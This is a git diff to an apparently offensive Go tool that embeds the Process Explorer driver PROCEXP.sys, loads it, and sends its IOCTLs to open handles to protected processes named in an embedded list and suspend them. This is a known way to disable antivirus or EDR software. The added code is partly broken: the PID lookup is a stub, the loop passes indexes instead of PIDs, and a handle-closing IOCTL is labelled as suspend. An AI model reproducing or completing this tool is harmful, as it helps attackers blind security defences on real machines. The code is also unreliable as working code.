@@ -8,11 +8,16 @@ import (
 	"path/filepath"
 	"strings"
 	"syscall"
+	"unsafe"
 
 	"github.com/fourcorelabs/wintoken"
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 )
+
+/*
+	I'm forced to declare the embedded files out of any function. I don't like it, maybe there is another way ?
+*/
 
 //go:embed Resources/Processes.txt
 var content_processes string
@@ -20,33 +25,46 @@ var content_processes string
 //go:embed Resources/PROCEXP.sys
 var driver []byte
 
-func suspend_processes(traget_proc_handle windows.HANDLE, targets []string) error {
-	windows.DeviceIoControl(traget_proc_handle, 0x7299c004, nil, 4, nil, 0, &local_1c, nil)
-
+func suspend_processes(target_proc_Handle windows.Handle, pid int) error {
+	// 0x83350004 = IOCTL_CLOSE_Handle
+	process_id := uint32(pid)
+	ret := windows.DeviceIoControl(target_proc_Handle, 0x83350004, (*byte)(unsafe.Pointer(&process_id)), 4, nil, 0, nil, nil)
+	fmt.Println("[INFO] Suspend process result:", ret)
+	if ret != nil {
+		return errors.New("[-] Error while suspending protected process")
+	}
 	return nil
 }
 
-func procexp_protected_process(volume_handle windows.HANDLE, pid int) (windows.HANDLE, error) {
-	// 0x8335003c = IOCTL_OPEN_PROTECTED_PROCESS_HANDLE
-	var handle windows.HANDLE = windows.NULL
-	a, b, c := windows.DeviceIoControl(volume_handle, 0x8335003c, pid, len(pid))
+func procexp_protected_process(volume_Handle windows.Handle, pid int) (windows.Handle, error) {
+	// 0x8335003c = IOCTL_OPEN_PROTECTED_PROCESS_Handle
+	var handle windows.Handle
+	process_id := uint32(pid)
+	var local uint32
+	ret := windows.DeviceIoControl(volume_Handle, 0x8335003c, (*byte)(unsafe.Pointer(&process_id)), 4, (*byte)(unsafe.Pointer(&handle)), 0, &local, nil)
+	fmt.Println("[INFO] Open protected process result:", ret)
+	if ret != nil {
+		return nil, errors.New("[-] Error while accessing protected process")
+	}
+
+	return handle, nil
 
 }
 
-func get_target_pid(process string) (int, error) {
+func get_target_pid(process string) ([]int, error) {
 	windows.Process32First()
 
 }
 
-func connect_procexp_device() (windows.HANDLE, error) {
-	var handle windows.HANDLE
+func connect_procexp_device() (windows.Handle, error) {
+	var Handle windows.Handle
 	var volume_name = fmt.Sprintf("\\\\.\\PROCEXP152")
-	handle, err := windows.CreateFile(windows.StringToUTF16Ptr(volume_name), 0xc0000000, 0, nil, windows.OPEN_EXISTING, 0x80, 0)
+	Handle, err := windows.CreateFile(windows.StringToUTF16Ptr(volume_name), 0xc0000000, 0, nil, windows.OPEN_EXISTING, 0x80, 0)
 	if err != nil {
 		return nil, errors.New("[-] Error while creating volume for procexp")
 	}
 
-	return handle, nil
+	return Handle, nil
 }
 
 func unload_driver(drivername string) error {
@@ -62,7 +80,7 @@ func unload_driver(drivername string) error {
 
 	_, _, err = proc.Call(uintptr(*namep))
 
-	// TODO: handle the driver errors ?
+	// TODO: Handle the driver errors ?
 	fmt.Println("[INFO] Driver unloading result is:", err)
 
 	return nil
@@ -81,7 +99,7 @@ func load_driver(drivername string) error {
 
 	_, _, err = proc.Call(uintptr(*namep))
 
-	// TODO: handle the driver errors ?
+	// TODO: Handle the driver errors ?
 	fmt.Println("[INFO] Driver loading result is:", err)
 
 	return nil
@@ -92,7 +110,7 @@ func adjust_privilege() error {
 
 	token, err := wintoken.OpenProcessToken(current_pid, wintoken.TokenPrimary)
 	if err != nil {
-		return errors.New("[-] Error while getting current token handle")
+		return errors.New("[-] Error while getting current token Handle")
 	}
 	defer token.Close()
 
@@ -242,13 +260,24 @@ func main() {
 	fmt.Println("[+] Successfully loaded PROCEXP driver")
 	defer unload_driver(DRIVERNAME)
 
-	volume_handle, err := connect_procexp_device()
+	volume_Handle, err := connect_procexp_device()
 	check(err)
 	fmt.Println("[+] Successfully connected to PROCEXP driver")
 
 	for i := 0; i < len(process_list); i++ {
-		pid := get_target_pid()
-		proc_handle, err := procexp_protected_process(volume_handle, pid)
-		err = suspend_processes(TBD)
+		pid_list, _ := get_target_pid(process_list[i])
+		if err != nil {
+			fmt.Println("[-] Error while retrieving PID for", process_list[i])
+		}
+		for pid := 0; pid < len(pid_list); pid++ {
+			proc_Handle, err := procexp_protected_process(volume_Handle, pid)
+			if err != nil {
+				fmt.Println("[-] Error while accessing protected process", process_list[i])
+			}
+			err = suspend_processes(proc_Handle, pid)
+			if err != nil {
+				fmt.Println("[-] Error while suspending protected process", process_list[i])
+			}
+		}
 	}
 }
